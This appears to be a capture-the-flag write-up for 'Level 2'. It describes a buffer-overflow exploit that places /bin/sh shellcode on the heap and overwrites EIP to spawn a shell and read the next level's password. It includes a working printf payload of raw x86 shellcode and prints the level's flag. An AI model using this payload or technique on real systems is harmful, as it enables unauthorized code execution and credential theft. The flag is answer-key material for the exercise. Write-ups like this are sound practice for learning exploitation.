# Level 2

In this level, we can't use overflow in the stack because of the condition. We need to put a shellcode in the heap and then overflow into EIP register with the heap address of the shellcode. To find how far we are from EIP, we need to try with an icreasing number of cycling characters like `a000b000c000d000e000f000g000h000i000j000k000l000m000n000o000p000u000r000s000t000u000v000w000x000y000z000A000B000C000D000E000F000G000H000I000J000K000L000M000N000O000P000Q000R000S000T000U000V000W000X000Y000Z000`.

We now need to create the shellcode. We simply compile a small [assembly program](./Ressources/shellcode.s) that execute `/bin/sh` and take the binary content.

```bash
printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn\x08\xa0\x04\x08\n" > /tmp/level2
cat /tmp/level2 - | ./level2
cat /home/user/level3/.pass
```

**Flag:** `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
